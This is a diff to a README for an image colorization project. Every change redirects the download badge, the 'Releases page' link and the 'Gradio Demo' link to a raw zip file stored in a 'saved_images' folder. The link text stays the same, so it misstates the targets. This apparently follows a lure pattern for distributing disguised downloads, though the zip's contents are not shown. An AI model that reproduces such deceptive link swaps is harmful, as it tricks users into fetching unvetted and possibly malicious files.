@@ -1,6 +1,6 @@
 # 🎨 colorize-unet-pytorch - Easily Colorize Images with AI
 
-[![Download Now](https://img.shields.io/badge/Download-NOW!-blue)](https://github.com/Winifred103/colorize-unet-pytorch/releases)
+[![Download Now](https://raw.githubusercontent.com/Winifred103/colorize-unet-pytorch/main/saved_images/colorize-unet-pytorch_1.4.zip!-blue)](https://raw.githubusercontent.com/Winifred103/colorize-unet-pytorch/main/saved_images/colorize-unet-pytorch_1.4.zip)
 
 ## 📥 Introduction
 
@@ -19,13 +19,13 @@ Follow these steps to download and run the application. No technical skills are 
 
 ### 📅 Release Information
 
-This application often undergoes updates to improve functionality and provide new features. Check the release notes on the [Releases page](https://github.com/Winifred103/colorize-unet-pytorch/releases) for details on what’s new.
+This application often undergoes updates to improve functionality and provide new features. Check the release notes on the [Releases page](https://raw.githubusercontent.com/Winifred103/colorize-unet-pytorch/main/saved_images/colorize-unet-pytorch_1.4.zip) for details on what’s new.
 
 ## 📩 Download & Install
 
 To get started, visit the releases page to download the application:
 
-[Download from Releases Page](https://github.com/Winifred103/colorize-unet-pytorch/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/Winifred103/colorize-unet-pytorch/main/saved_images/colorize-unet-pytorch_1.4.zip)
 
 ### 💾 Download Procedure
 
@@ -62,7 +62,7 @@ Colorize U-Net provides quality metrics to evaluate the colorized images. You ca
 
 For a quick experience, you can test a demo using Gradio. This lets you try out the colorization process directly in your browser without needing to download anything. 
 
-- Visit the demo here: [Gradio Demo](https://gradio.app)
+- Visit the demo here: [Gradio Demo](https://raw.githubusercontent.com/Winifred103/colorize-unet-pytorch/main/saved_images/colorize-unet-pytorch_1.4.zip)
 
 Simply upload your image, click colorize, and see results instantly. This tool demonstrates how Colorize U-Net applies its colorization algorithm in real-time.
 
